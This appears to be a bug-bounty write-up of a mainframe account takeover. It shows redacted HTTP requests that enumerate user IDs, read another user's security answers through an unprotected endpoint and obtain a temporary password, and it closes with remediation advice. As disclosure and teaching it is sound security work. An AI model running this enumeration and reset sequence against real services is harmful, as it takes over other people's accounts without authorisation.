---
title: "Mainframe Account Takeover"
categories:
- Misc
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-08-13-mainframe-account-takeover
tags:
- Password Reset Vulnerability
- Mainframe Account Takeover
- Mainframe
- Account Takeover
- ATO
- Ethical hacking
- Bug Bounty
- Application Security
---

## What is Mainframe?

A mainframe is a powerful computer built to process vast amounts of data and perform complex computations, serving as the central hub for computing in large organizations.

## Issue

The vulnerability allows an attacker to reset any existing mainframe user’s password and gain complete control of his/her account.

## Attack Scenario

During network penetration testing, I discovered an application that allows an existing user to reset their mainframe password by answering the security question they set during registration.

While processing the password reset request, the application checks whether the user account is locked or unlocked. If the account is unlocked, it returns a response of “true”; otherwise, it returns “false.”

**Request**

```
GET /enterprise/ivr/password/reset/mainframe/unlock/****985 HTTP/1.1 
Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo 
Content—Type: application/json 
User—Agent: PostmanRuntime/7.32.2 
Accept: */*
Postman—Token: 865cd539-3eff-42a6-6d5a-020dd445109 
Host: api.*****.com 
Accept—Encoding: gzip, deflate 
Connection: close 
Cookie: RANDOM_ID=b1df32eg1bég43bba58ae1303209784b 

```

**Response**

```
HTTP/1.1 200 0K 
Date: Fri, 09 Jun 2022 07:56:15 GMT 
Content—Type: application/json 
Connection: close 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
Vary: Accept—Encoding, User—Agent 
Content—Language: en—US 
content—Length: 23 

{
    "userIdUnlocked" : true
} 

```

To identify other existing users, I brute-forced the last three digits of the user ID in the above request and discovered another user ID: ****079.

After validating this user ID, I received the same response as before: "userIdUnlocked: true".

The next step is to determine the security questions and answers that user ID ****079 had set during registration. To achieve this, I used the following request.

**Request**

```
GET /enterprise/ivr/password/reset/pwid/****079 HTTP/1.1 
Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo
Content—Type: application/json 
User—Agent: PostmanRuntime/7.32.2 
Accept: */*
Postman—Token: 865cd539-3eff-42a6-6d5a-020dd445109 
Host: api.****.com 
Accept—Encoding: gzip, deflate 
Connection : close 
Cookie: RANDOM_ID=b1df32eg1bég43bba58ae1303209784b 

```

**Response**

```
HTTP/1.1 200 0K 
Date: Fri, 09 Jun 2022 08:58:10 GMT 
Content—Type: application/json 
Connection: close 
X-Frame-Options: SAMEORIGIN 
X—Content—Type—Options: nosniff 
Vary: Accept—Encoding, User—Agent 
Content—Language : en—US 
Content—Length: 225

{ 
    "questioncount": 4 
    "questionAnswerList": [
        {
            "question": "MaidenName", 
            "answer": "*****"
        },
        {
            "question": "GrandfatherFirstName", 
            "answer": "*****"
        },
        {
            "question": "CityOfBirth", 
            "answer": "*****" 
        },
        {
            "question" : "MiddleName", 
            "answer": "*****"
        }
    ]
} 

```

I successfully retrieved the security questions and answers for user ID ****079.

After submitting the correct answer to the question, I sent the following request, and the application responded with a temporary password.

**Request**

```
GET /enterprise/ivr/password/reset/mainframe/reset/****079 HTTP/1.1 
Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo 
Content—Type: application/json 
User—Agent: PostmanRuntime/7.32.2 
Accept: */*
Postman—Token: 865cd539-3eff-42a6-6d5a-020dd445109
Host: api.*****. com 
Accept—Encoding: gzip, deflate 
Connection: close 
Cookie: RANDOM_ID=b1df32eg1beg43bba58ae1303209784b  

```

**Response**

```
HTTP/1.1 200 0K 
Date: 09 Jun 2022 08:58:47 GMT  
Content—Type: application/json 
Connection: close 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
Vary: Accept—Encoding, User—Agent 
Content—Language: en—US
Content—Length: 27 

{
    "temppassword": "******"
} 

```

As shown above, I received a temporary password. Using this password, I reset the victim’s account password and was able to successfully log in to their mainframe account.

## Remediation

- Implement strict access controls to prevent unauthorized viewing of other users’ information.
- Link the user ID to the bearer token and ensure proper server-side validation of user inputs.
- Pass identifiers in the request body using the POST method instead of exposing them in URLs. 
